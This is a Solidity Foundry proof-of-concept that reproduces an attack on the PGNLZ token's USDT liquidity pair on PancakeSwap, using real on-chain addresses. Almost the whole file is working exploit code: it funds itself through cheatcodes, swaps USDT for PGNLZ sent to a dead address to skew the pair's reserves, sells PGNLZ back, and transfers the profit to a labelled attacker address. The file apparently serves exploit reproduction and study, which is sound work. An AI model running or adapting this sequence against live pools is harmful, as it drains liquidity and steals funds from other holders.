// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./PGNLZBase.sol";
import "src/shared/interfaces.sol";

IERC20 constant USDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant BTCB_TOKEN = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
IERC20 constant PGNLZ = IERC20(0x6b923cF1d592E6AA07ea7249d817A843C30ac69E);

IPancakePair constant USDT_PGNLZ_PAIR = IPancakePair(0x8Cd8E57BCd00857BebE891A2349f32738Cb7E658);
IPancakeRouter constant PANCAKE_ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

address constant ATTACKER_ADDR = address(0xFE95ECc0795399662221AB48948CDcF3f6D4AA86);
address constant DEAD_ADDR = address(0x000000000000000000000000000000000000dEaD);

contract PoC_Nobles3689 is PGNLZBase {
    function setUp() public override {
        super.setUp();
        addVulnerability(VulnerabilityType.UNKNOWN);
        addAttackVector(AttackVector.UNKNOWN);
        addMitigation(Mitigation.UNKNOWN);

        vm.label(address(ATTACKER_ADDR), "ATTACKER");
        vm.label(address(DEAD_ADDR), "DEAD_ADDR");
        vm.label(address(USDT_TOKEN), "USDT");
        vm.label(address(BTCB_TOKEN), "BTCB");
        vm.label(address(PGNLZ), "PGNLZ");
        vm.label(address(USDT_PGNLZ_PAIR), "USDT_PGNLZ_PAIR");
        vm.label(address(PANCAKE_ROUTER), "PANCAKE_ROUTER");

        fundingToken = address(USDT_TOKEN);
        beneficiary = ATTACKER_ADDR;
    }

    function testExploit() public exploit {
        vm.startPrank(ATTACKER_ADDR, ATTACKER_ADDR);
        Exploit eX = new Exploit();
        vm.allowCheatcodes(address(eX));
        eX.attack();
        vm.stopPrank();
    }
}

contract Exploit is Test {
    function attack() public {
        // 초기 자본 확보
        uint256 borrow_USDT = 30_000_000_000_000_000_000_000_000;
        deal(address(USDT_TOKEN), address(this), borrow_USDT);
        USDT_TOKEN.approve(address(PANCAKE_ROUTER), borrow_USDT);
        // PGNLZ 토큰 확보
        deal(address(PGNLZ), address(this), 17_067_858_689_593_975_791);
        PGNLZ.approve(address(PANCAKE_ROUTER), 17_067_858_689_593_975_791);

        uint256 PGNLZ_balance = PGNLZ.balanceOf(address(USDT_PGNLZ_PAIR));
        emit log_named_decimal_uint("Pair PGNLZ balance before swap", PGNLZ_balance, 18);
        uint256 USDT_balance = USDT_TOKEN.balanceOf(address(USDT_PGNLZ_PAIR));
        emit log_named_decimal_uint("Pair USDT balance before swap", USDT_balance, 18);

        // PGNLZ 토큰 1차 swap (USDT -> PGNLZ)
        uint256 first_PGNLZ = 978_266_448_473_094_381_826_106;
        address[] memory path = new address[](2);
        path[0] = address(USDT_TOKEN);
        path[1] = address(PGNLZ);
        PANCAKE_ROUTER.swapTokensForExactTokens(first_PGNLZ, borrow_USDT, path, address(DEAD_ADDR), 1_769_519_797);

        PGNLZ_balance = PGNLZ.balanceOf(address(USDT_PGNLZ_PAIR));
        emit log_named_decimal_uint("Pair PGNLZ balance after firstswap", PGNLZ_balance, 18);
        USDT_balance = USDT_TOKEN.balanceOf(address(USDT_PGNLZ_PAIR));
        emit log_named_decimal_uint("Pair USDT balance after first swap", USDT_balance, 18);

        // PGNLZ 토큰 2차 swap (PGNLZ -> USDT)
        uint256 second_PGNLZ = 17_067_858_689_593_975_791;
        path[0] = address(PGNLZ);
        path[1] = address(USDT_TOKEN);
        PANCAKE_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            second_PGNLZ, 0, path, address(this), 1_769_519_797
        );

        PGNLZ_balance = PGNLZ.balanceOf(address(USDT_PGNLZ_PAIR));
        emit log_named_decimal_uint("Pair PGNLZ balance after second swap", PGNLZ_balance, 18);
        USDT_balance = USDT_TOKEN.balanceOf(address(USDT_PGNLZ_PAIR));
        emit log_named_decimal_uint("Pair USDT balance after second swap", USDT_balance, 18);

        // exploit 결과
        USDT_TOKEN.transfer(address(ATTACKER_ADDR), USDT_TOKEN.balanceOf(address(this)) - borrow_USDT);
    }
}
